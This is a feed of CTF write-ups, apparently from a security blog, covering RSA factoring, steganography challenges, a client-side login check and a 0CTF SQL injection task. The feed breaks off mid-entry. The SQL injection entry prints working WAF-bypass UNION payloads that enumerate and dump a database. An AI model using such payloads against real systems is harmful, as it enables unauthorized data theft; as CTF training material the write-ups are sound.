<p>Let's see how it looks this tiem:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cat ciphertext2.txt</div><div class="line">n: 292977443899368435277959020404942780635643</div><div class="line">e: 65537</div><div class="line">c: 116661734456209126203156567366346251672660</div></pre></td></tr></table></figure></p>
<p>This time we got <code>n</code> but not <code>p</code> and <code>q</code>.</p>
<p>Maybe <a href="https://factordb.com/index.php?query=292977443899368435277959020404942780635643" target="_blank" rel="external">factordb</a> can help us: <code>292977443899368435277959020404942780635643 = 471665935909122708917 · 621154553666596093679</code>.</p>
<p>We can now use the same script (from RSA 1 challenge).</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"></div><div class="line"><span class="comment"># credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2Text</span><span class="params">(number, size)</span>:</span></div><div class="line">    text = <span class="string">""</span>.join([chr((number &gt;&gt; j) &amp; <span class="number">0xff</span>)</div><div class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> reversed(range(<span class="number">0</span>, size &lt;&lt; <span class="number">3</span>, <span class="number">8</span>))])</div><div class="line">    <span class="keyword">return</span> text.lstrip(<span class="string">"\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, y, x = egcd(b % a, a)</div><div class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> x % m</div><div class="line"></div><div class="line">p = <span class="number">471665935909122708917</span></div><div class="line">q = <span class="number">621154553666596093679</span></div><div class="line">e = <span class="number">65537</span></div><div class="line">c = <span class="number">116661734456209126203156567366346251672660</span></div><div class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</div><div class="line">d = modinv(e, phi)</div><div class="line">n = p*q</div><div class="line"></div><div class="line">m_int = pow(c,d,n)</div><div class="line"></div><div class="line"><span class="keyword">print</span> int2Text(m_int, len(str(m_int)))</div></pre></td></tr></table></figure></p>
<p>Output:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python2 rsa2.py</div><div class="line">flag&#123;l0w_n_79c0&#125;</div></pre></td></tr></table></figure></p>
<h2 id="85-zooooooom-forensics">85 - Zooooooom - Forensics</h2>
<blockquote>
<p><a href="https://www.easyctf.com/static/d9040024afd9d38b73c72e30f722cf09e1093e3c_hekkerman.jpg" target="_blank" rel="external">Hekkerman</a> is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can't?</p>
</blockquote>
<p>Image:</p>
<p><img src="http://i.imgur.com/HdmaNou.jpg" alt="image"></p>
<p>We can see there is a thumbnail, let's extract it. But the thumbnail itself have a thumbnail:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ exiftool -b -ThumbnailImage hekkerman.jpg &gt; thumbnail.jpg</div><div class="line">$ exiftool -b -ThumbnailImage thumbnail.jpg &gt; thumbnail_thumbnail.jpg</div></pre></td></tr></table></figure></p>
<p>Thumbnail:</p>
<p><img src="http://i.imgur.com/R1WBI21.jpg" alt="thumbnail"></p>
<p>Thumbnail of the thumbnail:</p>
<p><img src="http://i.imgur.com/v5LWUDs.jpg" alt="thumbnail thumbnail"></p>
<p>Flag is: <code>easyctf{d33p_zo0m_HeKker_2c1ae5}</code>.</p>
<p><strong>Note</strong>: this is Steganography not Digital Forensics.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="programming" scheme="https://rawsec.ml/tags/programming/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
    
      <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
    
      <category term="reversing" scheme="https://rawsec.ml/tags/reversing/"/>
    
  </entry>
  
  <entry>
    <title>0CTF 2017 Quals - Write-ups</title>
    <link href="https://rawsec.ml/en/0CTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/0CTF-2017-write-ups/</id>
    <published>2017-03-20T23:00:00.000Z</published>
    <updated>2017-03-21T22:21:12.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : 0CTF 2017 Quals</li>
<li><strong>Website</strong> : <a href="https://ctf.0ops.net/" target="_blank" rel="external">ctf.0ops.net</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/402" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="welcome-misc">Welcome - Misc</h2>
<blockquote>
<p>Welcome to 0CTF 2017~</p>
<p>irc: <a href="http://irc.freenode.net" target="_blank" rel="external">irc.freenode.net</a> #0ctf2017</p>
</blockquote>
<p><code>flag{Welcome_to_0CTF_2017}</code></p>
<h2 id="simplesqlin-web">simplesqlin - Web</h2>
<blockquote>
<p><a href="http://202.120.7.203" target="_blank" rel="external">http://202.120.7.203</a></p>
</blockquote>
<p>The injectable request: <code>http://202.120.7.203/index.php?id=3</code>.</p>
<p>Keywords blocked:</p>
<ul>
<li><code>SELECT</code>, <code>sElEcT</code>, <code>%53elect</code>, <code>sel/**/ect</code> (not blocked but doesn't work), <code>/*!%53eLEct*/</code></li>
<li><code>FROM</code></li>
<li><code>WHERE</code></li>
</ul>
<p><code>?id=2 order by 3</code> works and <code>?id=2 order by 4</code> doesn't so there is 3 columns in the actual table.</p>
<p>Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (<em>Keywords blocked</em>), a lot of tricks don't work but I find one that is working: <code>se%0blect</code>, injecting a character that does nothing in our context like <code>%0b</code> (vertical tab) or <code>%07</code> (bell).</p>
<p><code>?id=99999 UNION SEL%0bECT 1,2,3</code> 99999 is an out of range id so the <code>UNION</code> statement is executed. <code>2</code> is displayed in the <code>&lt;h3&gt;&lt;/h3&gt;</code>, <code>3</code> is displayed in the <code>&lt;div class=&quot;main&quot;&gt;3&lt;/div&gt;</code> and <code>1</code> is displayed in the link <code>&lt;a href=&quot;index.php?id=1&quot;&gt;</code>.</p>
<p>Now let's identify the databse:</p>
<ul>
<li><code>?id=99999 UNION SEL%0bECT 1,user(),version()</code>: user: <code>news@localhost</code>, version: <code>5.7.17-0ubuntu0.16.04.1</code></li>
<li><code>?id=99999 UNION SEL%0bECT 1,database(),3</code>: database: <code>news</code></li>
<li><code>?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news'</code>: table name: <code>flag</code></li>
<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -</code>: 1st column name: <code>flag</code></li>
<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -</code>: there is only 1 column</li>
<li><code>?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag</code>: flag: <code>flag{W4f_bY_paSS_f0R_CI}</code></li>
</ul>
<p>References: <a href="http://sechow.com/bricks/docs/content-page-1.html" target="_blank" rel="external">1</a> - <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#SQLi" target="_blank" rel="external">2</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Pragyan CTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/PragyanCTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/PragyanCTF-2017-write-ups/</id>
    <published>2017-03-03T23:00:00.000Z</published>
    <updated>2017-03-06T16:25:20.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Pragyan CTF 2017</li>
<li><strong>Website</strong> : <a href="https://ctf.pragyan.org/home" target="_blank" rel="external">ctf.pragyan.org</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/420/" target="_blank" rel="external">link</a></li>
</ul>
<p>Pragyan CTF 2017 was one of the worst ctf ever. All challenge was guessing or steganography, web were always down, no irc, ... a shame.</p>
<h1 id="50-look-harder-forencics">50 - Look Harder - Forencics</h1>
<blockquote>
<p>There are rumours that in the Great Sahara Desert, a great treasure has been buried deep inside the ground, but the map for the exact location of the treasure over the years, has not been preserved properly.
You have got hold of the map, but it looks nothing more than a plain white sheet of paper. Can you make sense out of it ??</p>
<p><a href="https://ctf.pragyan.org/download?file_key=dcf38b6fe45c2cf517f6aee056013674d3be7d0f7624cb029c4932d202b0c995&amp;team_key=2f700f66c76a10df5bf3951c45926037452ccba47785e3710d8c8f0657ca979e" target="_blank" rel="external">reasure_map.png</a></p>
</blockquote>
<p>I used stegsolve and blue plane 4 revealed a QR code.</p>
<p><img src="http://i.imgur.com/GNnLLfD.png" alt=""></p>
<p>I next used <a href="https://zxing.org/" target="_blank" rel="external">Zxing online</a> to decode teh QR code: <code>stay_pragyaned</code>.</p>
<p>Flag: <code>pragyanctf{stay_pragyaned}</code>.</p>
<p><strong>Important note</strong>: this is a steganography challenge, not a digital forencics one as pretend organizers.</p>
<h1 id="150-interstellar-forencics">150 - Interstellar - Forencics</h1>
<blockquote>
<p>Dr. Cooper, on another one of his endless journeys encounter a mysterious planet. However when he tried to land on it, the ship gave way and he was left stranded on the planet. Desperate for help, he relays a message to the mothership containing the details of the people with him. Their HyperPhotonic transmission is 10 times the speed of light, so there is no delay in the message. However, a few photons and magnetic particles interefered with the transmission, causing it to become as shown in the picture. Can you help the scientists on the mothership get back the original image?</p>
<p><a href="https://ctf.pragyan.org/download?file_key=cbd65f738c1f6c2aedb47758e847239317188d6fb87485930ab7817909eaa333&amp;team_key=2f700f66c76a10df5bf3951c45926037452ccba47785e3710d8c8f0657ca979e" target="_blank" rel="external">transmission.png</a></p>
</blockquote>
<p>Image is badly dammaged.</p>
<p><img src="http://i.imgur.com/15lOtfp.jpg" alt=""></p>
<p>I used stegsolve and the Invert Color (Xor) showed me: <code>The flag is {Cooper_Brand}</code>.</p>
<p><img src="http://i.imgur.com/CuDDz4z.jpg" alt=""></p>
<p>Flag: <code>pragyanctf{Cooper_Brand}</code>.</p>
<p><strong>Important note</strong>: this is a steganography challenge, not a digital forencics one as pretend organizers.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="stegano" scheme="https://rawsec.ml/tags/stegano/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WhiteHat Challenge 01 - 20 - For001 - Forensics</title>
    <link href="https://rawsec.ml/en/WhiteHat-Challenge-01-20-For001-Forensics/"/>
    <id>https://rawsec.ml/en/WhiteHat-Challenge-01-20-For001-Forensics/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-03-21T22:24:32.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : WhiteHat Challenge 01</li>
<li><strong>Website</strong> : <a href="https://wargame.whitehat.vn/" target="_blank" rel="external">wargame.whitehat.vn</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/429" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="description">Description</h3>
<blockquote>
<p>Can you find the secret in this image?
Download file here:</p>
<p><a href="http://material.wargame.whitehat.vn/challenges/1/For001_b9f7cdc52232efc20abe3ca3df14be5d.zip" target="_blank" rel="external">http://material.wargame.whitehat.vn/challenges/1/For001_b9f7cdc52232efc20abe3ca3df14be5d.zip</a></p>
<p>Submit WhiteHat{sha1(flag)}</p>
</blockquote>
<h2 id="solution">Solution</h2>
<p>The zip contain an image: <code>LSB.png</code>.</p>
<p>Let's try to retrive something with LSB attack, I found a Microsoft Word 2007 document.</p>
<p>Trying to open it with LibreOffice said me that the document is corrupted.</p>
<p>As it is only an archive I extrated it with <code>7z</code>.</p>
<p>I then open the <code>document.xml</code> and I found that:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">. .- ... -.-- ..-. --- .-. . -. ... .. -.-.</div></pre></td></tr></table></figure></p>
<p>It is morse. So I used <a href="http://www.dcode.fr/morse-code" target="_blank" rel="external">http://www.dcode.fr/morse-code</a> to decode the message.</p>
<p>That gave me <code>EASYFORENSIC</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;EASYFORENSIC&apos; | sha1sum</div><div class="line">ffed6da75c3296041fc52abc75298e120c350917  -</div><div class="line"></div><div class="line">$ printf %s &apos;easyforensic&apos; | sha1sum</div><div class="line">1f0aa393d3e5369f391c35a793bcf1178b8299a0  -</div></pre></td></tr></table></figure></p>
<p>So flag is <code>WhiteHat{1f0aa393d3e5369f391c35a793bcf1178b8299a0}</code>.</p>
<p><em>Note</em>: Again, this is stegano not digital forencis...</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Xiomara CTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/XiomaraCTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/XiomaraCTF-2017-write-ups/</id>
    <published>2017-02-26T23:00:00.000Z</published>
    <updated>2017-02-27T19:36:18.969Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : Xiomara CTF 2017</li>
<li><strong>Website</strong> : <a href="https://xiomara.xyz/" target="_blank" rel="external">xiomara.xyz</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/430/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="50-easy-login-web-exploitation">50 - Easy Login? - Web Exploitation</h2>
<blockquote>
<p>An aspiring engineer started learning web development on Youtube a day ago and he was asked to build a nice, secure, simple login page as part of his project. Well, he just started off so don't blame him. Go, hack!</p>
<p><a href="http://139.59.61.220:23478/" target="_blank" rel="external">http://139.59.61.220:23478/</a></p>
</blockquote>
<p>The source is suspicious:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"flag.css"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>= <span class="string">"center"</span>&gt;</span>Login Portal<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Username :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span> =<span class="string">"username"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">b</span>&gt;</span> Password :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">"Login()"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"verify"</span> <span class="attr">name</span>=<span class="string">"button"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>Let's see <code>main.js</code>:</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> username=<span class="built_in">document</span>.login.username.value;</div><div class="line">    <span class="keyword">var</span> password=<span class="built_in">document</span>.login.password.value;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (password == <span class="string">"53cure"</span> &amp;&amp; username==<span class="string">"@nokh@"</span>) &#123;</div><div class="line">        alert(<span class="string">"Awesome!"</span>);</div><div class="line">             <span class="built_in">window</span>.open(<span class="string">"secureflag.html"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"Oh swap!You are close. Why cant you try again?"</span>);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Now we can use <code>@nokh@</code> and <code>53cure</code> or directly go to <a href="http://139.59.61.220:23478/secureflag.html" target="_blank" rel="external">http://139.59.61.220:23478/secureflag.html</a>.</p>
<p>The image is named <code>hiddenflag.jpeg</code> so let's download it.</p>
<p>There is some hidden data here:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">$ binwalk hiddenflag.jpeg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">48981         0xBF55          Zip archive data, at least v1.0 to extract, compressed size: 29, uncompressed size: 29, name: flag.txt</div><div class="line">49154         0xC002          End of Zip archive</div><div class="line"></div><div class="line">$ foremost -v hiddenflag.jpeg</div><div class="line">Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus</div><div class="line">Audit File</div><div class="line"></div><div class="line">Foremost started at Sun Feb 26 19:14:21 2017</div><div class="line">Invocation: foremost -v hiddenflag.jpeg</div><div class="line">Output directory: /home/noraj/CTF/XiomaraCTF/2017/output</div><div class="line">Configuration file: /etc/foremost.conf</div><div class="line">Processing: hiddenflag.jpeg</div><div class="line">|------------------------------------------------------------------</div><div class="line">File: hiddenflag.jpeg</div><div class="line">Start: Sun Feb 26 19:14:21 2017</div><div class="line">Length: 48 KB (49176 bytes)</div><div class="line"></div><div class="line">Num	 Name (bs=512)	       Size	 File Offset	 Comment</div><div class="line"></div><div class="line">0:	00000000.jpg 	      47 KB 	          0 	 </div><div class="line">foundat=flag.txtUT</div><div class="line">1:	00000095.zip 	      196 B 	      48981 	 </div><div class="line">*|</div><div class="line">Finish: Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">2 FILES EXTRACTED</div><div class="line"></div><div class="line">jpg:= 1</div><div class="line">zip:= 1</div><div class="line">------------------------------------------------------------------</div><div class="line"></div><div class="line">Foremost finished at Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">$ cd output/zip</div><div class="line"></div><div class="line">$ unzip 00000095.zip</div><div class="line">Archive:  00000095.zip</div><div class="line"> extracting: flag.txt</div><div class="line"></div><div class="line">$ cat flag.txt</div><div class="line">xiomara&#123;50_y0u_ar3_@_h@ck3r&#125;</div></pre></td></tr></table></figure></p>
<h2 id="50-lulz-web-exploitation">50 - Lulz - Web Exploitation</h2>
<blockquote>
<p>Heavy sarcasm awaits. Are you a person who finds opportunities even in trolls? Well, let's find out.</p>
<p><a href="http://139.59.61.220:23456" target="_blank" rel="external">http://139.59.61.220:23456</a></p>
</blockquote>
<p>The webpage is a troll opening a pop-up and redirecting to a troll page: <a href="http://139.59.61.220:23456/troll.html" target="_blank" rel="external">http://139.59.61.220:23456/troll.html</a></p>
<p>But of course you are using NoScript or know about <code>view-source:</code> in Firefox.</p>
<p>Let's see the source (<code>view-source:http://139.59.61.220:23456/</code>):</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hahaha!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"lol.jpg"</span> <span class="attr">align</span> =<span class="string">"center"</span> <span class="attr">width</span> =<span class="string">"50%"</span> <span class="attr">height</span> = <span class="string">"50%"</span> <span class="attr">alt</span> =<span class="string">"lollol"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"hook.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p><code>hook.js</code> source:</p>
